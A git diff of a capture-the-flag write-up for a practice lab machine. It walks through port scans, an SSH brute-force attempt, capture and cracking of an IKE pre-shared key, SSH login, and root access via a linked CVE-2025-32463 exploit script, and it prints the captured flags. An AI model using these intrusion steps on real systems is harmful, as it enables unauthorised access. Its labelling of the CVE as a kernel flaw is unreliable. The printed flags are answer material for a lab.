@@ -1,10 +1,16 @@
+**Author:** Karthick Raghul  
+**Date:** 2026-01-29  
 
-❯ nmap 10.129.97.139                 
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-22 11:40 +0530
-Warning: 10.129.97.139 giving up on port because retransmission cap hit (10).
-Nmap scan report for 10.129.97.139
-Host is up (0.39s latency).
-Not shown: 993 closed tcp ports (conn-refused)
+---
+##  Reconnaissance
+
+### TCP Scan
+
+```bash
+nmap 10.129.97.139
+
+Result:
+
 PORT      STATE    SERVICE
 22/tcp    open     ssh
 514/tcp   filtered shell
@@ -13,147 +19,150 @@ PORT      STATE    SERVICE
 9000/tcp  filtered cslistener
 10010/tcp filtered rxapi
 26214/tcp filtered unknown
+```
 
+Only SSH is accessible . Bruteforce was blocked:
 
----
+```bash
+hydra -l admin -P rockyou.txt ssh://10.129.97.139
+```
 
+Connection errors indicate protection / rate limiting.
+Service Fingerprinting
 
+```bash
+nmap -p22 -sV --script ssh2-enum-algos,ssh-hostkey 10.129.97.139
 
-~ took 9s 
-❯ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.129.97.139 -t 4
-Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+OpenSSH 10.0p2 Debian 8
+```
 
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-22 12:16:38
-[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14344398), ~3586100 tries per task
-[DATA] attacking ssh://10.129.97.139:22/
-[ERROR] all children were disabled due too many connection errors
-0 of 1 target completed, 0 valid password found
-[INFO] Writing restore file because 2 server scans could not be completed
-[ERROR] 1 target was disabled because of too many errors
-[ERROR] 1 targets did not complete
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-22 12:17:10
+ **UDP Enumeration**
 
+```bash
+sudo nmap -sU --top-ports 100 10.129.97.139
 
----
+500/udp open isakmp
 
+```
 
-~ 
-❯       nmap -p22 -sV --script ssh2-enum-algos,ssh-hostkey 10.129.97.139
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-22 13:06 +0530
-Nmap scan report for 10.129.97.139
-Host is up (0.39s latency).
+**Full scan:**
 
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
-| ssh2-enum-algos: 
-|   kex_algorithms: (10)
-|       mlkem768x25519-sha256
-|       sntrup761x25519-sha512
-|       sntrup761x25519-sha512@openssh.com
-|       curve25519-sha256
-|       curve25519-sha256@libssh.org
-|       ecdh-sha2-nistp256
-|       ecdh-sha2-nistp384
-|       ecdh-sha2-nistp521
-|       ext-info-s
-|       kex-strict-s-v00@openssh.com
-|   server_host_key_algorithms: (4)
-|       rsa-sha2-512
-|       rsa-sha2-256
-|       ecdsa-sha2-nistp256
-|       ssh-ed25519
-|   encryption_algorithms: (6)
-|       chacha20-poly1305@openssh.comq
-|       aes128-gcm@openssh.com
-|       aes256-gcm@openssh.com
-|       aes128-ctr
-|       aes192-ctr
-|       aes256-ctr
-|   mac_algorithms: (10)
-|       umac-64-etm@openssh.com
-|       umac-128-etm@openssh.com
-|       hmac-sha2-256-etm@openssh.com
-|       hmac-sha2-512-etm@openssh.com
-|       hmac-sha1-etm@openssh.com
-|       umac-64@openssh.com
-|       umac-128@openssh.com
-|       hmac-sha2-256
-|       hmac-sha2-512
-|       hmac-sha1
-|   compression_algorithms: (2)
-|       none
-|_      zlib@openssh.com
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+sudo nmap -sU -sV 10.129.97.139
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 15.70 seconds
-
----
-
-❯ sudo nmap -sU --top-ports 100 -T4 --max-retries 2 -n 10.129.97.139
-Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-22 13:54 +0530
-Warning: 10.129.97.139 giving up on port because retransmission cap hit (2).
-Nmap scan report for 10.129.97.139
-Host is up (0.21s latency).
-Not shown: 92 open|filtered udp ports (no-response)
-PORT      STATE  SERVICE
-7/udp     closed echo
-9/udp     closed discard
-500/udp   open   isakmp
-1645/udp  closed radius
-1812/udp  closed radius
-5000/udp  closed upnp
-49194/udp closed unknown
-49201/udp closed unknown
-
-Nmap done: 1 IP address (1 host up) scanned in 9.32 seconds
-
-
----
-❯ sudo nmap -sV -sU 10.129.97.139 
-Nmap scan report for 10.129.97.139
-Host is up (0.40s latency).
-Not shown: 996 closed udp ports (port-unreach)
-PORT     STATE         SERVICE   VERSION
-68/udp   open|filtered dhcpc
-69/udp   open|filtered tftp
-500/udp  open          isakmp?
+500/udp  open isakmp
 4500/udp open|filtered nat-t-ike
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port500-UDP:V=7.98%I=7%D=1/22%Time=6971DFD2%P=x86_64-pc-linux-gnu%r(IKE
-SF:_MAIN_MODE,70,"\0\x11\"3DUfwO\x8eR\xce\x91u\x20\x81\x01\x10\x02\0\0\0\0
-SF:\0\0\0\0p\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20\
-SF:x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x01\x80
-SF:\x0b\0\x01\x80\x0c\0\x01\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\0\0\0\x14\x
-SF:af\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0")%r(IPSEC_START,9C,"1'
-SF:\xfc\xb08\x10\x9e\x89\xfc\xdazA\xa7\xa2X\x8d\x01\x10\x02\0\0\0\0\0\0\0\
-SF:0\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\0\x20\x01\
-SF:x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x03\x80\x0b
-SF:\0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0\0\x14\xaf
-SF:\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb7\xd5n\xbc
-SF:\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\xcb\x80\x91
-SF:>\xbbin\x08c\x81\xb5\xecB{\x1f");
+```
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 1423.30 seconds
-
+This indicates ***IPSec / IKE VPN.***
 
 ---
-https://www.verylazytech.com/network-pentesting/ipsec-ike-vpn-port-500-udp
----
 
+## IKE Enumeration
 
-❯ sudo nmap -sU -p 500 --script ike-version 10.129.97.139
-[sudo] password for karthi: 
+Check IKE version:
+
+```
+sudo nmap -sU -p 500 --script ike-version 10.129.97.139
+
 Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-22 14:54 +0530
 Nmap scan report for 10.129.97.139
 Host is up (0.21s latency).
 
 PORT    STATE SERVICE
 500/udp open  isakmp
-| ike-version: 
-|   attributes: 
+| ike-version:
+|   attributes:
 |     XAUTH
 |_    Dead Peer Detection v1.0
 
 Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
+```
+
+>[!WARNING]
+After machine reset:
+> 
+>     New IP: 10.129.238.52
+ 
+**Aggressive Mode Handshake**
+
+```bash
+sudo ike-scan -A --pskcrack 10.129.238.52
+
+Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
+10.129.238.52	Aggressive Mode Handshake returned HDR=(CKY-R=32e00c1af2763f19) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)
+
+IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
+ac2863985cc1259c612bb613f648bcab17eb767311bf5bd49a65c22262ae8ed223a151bff5a941bc8188cc1e2acef09fe72cbff4dc92ab30692565e79688e722a3f7a0596ada9048738249c729257b80a88dc8c715338a9dfcb254e55f4c5262b4f04ae30490bb2316aad9b7b9e047443538f1276a0a684f4112df4df36fe5b0:c4e81b9f2b0eed7ef7840399613e4c186a96351a5e92416bb81419ed0ec48666315cd8a37527f76a8b4579452a089c0056a45d863f08f3edbae7275b0ff0b5947cbdd297828f823e4aed6d8614fe887e7f7303f6ec64b277b37805a5ef5a49c0f555f0f9dab6a4af4846850df6391e39161cddf9ac934d18486439ccfa0d3556:32e00c1af2763f19:de8e7d5874400eee:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:20b439650615f705b8b9ffb47e5ea3b574540ba1:00223cdfcbc245ac753ca58c99cc350390da71e2326150cfec16f627774c37d2:6433bfbfca48a806f24101086b5b324c47db61ca
+Ending ike-scan 1.9.6: 1 hosts scanned in 0.478 seconds (2.09 hosts/sec).  1 returned handshake; 0 returned notify
+```
+
+
+So:
+
+> - IKE Aggressive Mode is enabled  
+> - Uses Pre-Shared Key  
+> - Identity: ike@expressway.htb  
+
+Saved to:
+
+presharedkey.txt
+
+**Crack PSK**
+
+```bash
+hashcat -m 5400 presharedkey.txt /usr/share/wordlists/rockyou.txt
+
+```
+**Result:**
+
+PSK: freakingrockstarontheroad
+
+**SSH Access**
+
+```bash
+ssh ike@10.129.238.52
+```
+
+Password:
+
+freakingrockstarontheroad
+
+**User Flag**  : `b218ca5deab50f207afb36946e3f7a89`
+
+---
+## Privilege Escalation
+
+**Kernel:**
+
+```bash
+uname -a
+
+Linux 6.16.7+deb14
+```
+
+*Vulnerable to:*      `CVE-2025-32463 (chwoot)`
+
+Reference exploit:
+https://github.com/pr0v3rbs/CVE-2025-32463_chwoot
+
+**Exploit**
+
+Upload exploit script:
+
+```bash
+cd /tmp
+chmod +x exploit.sh
+./exploit.sh
+```
+
+ **Root Flag**
+
+cd /root
+cat root.txt
+`85d13075e1f162d45c7ab1278f924238`
+
+---
+### Confestion :
+
+>     The harsh truth is I cannot complete it fully so i references a blog in medium , I fill guilty for it But one day I am sure that I will be capable to complete and provide my own writeups 
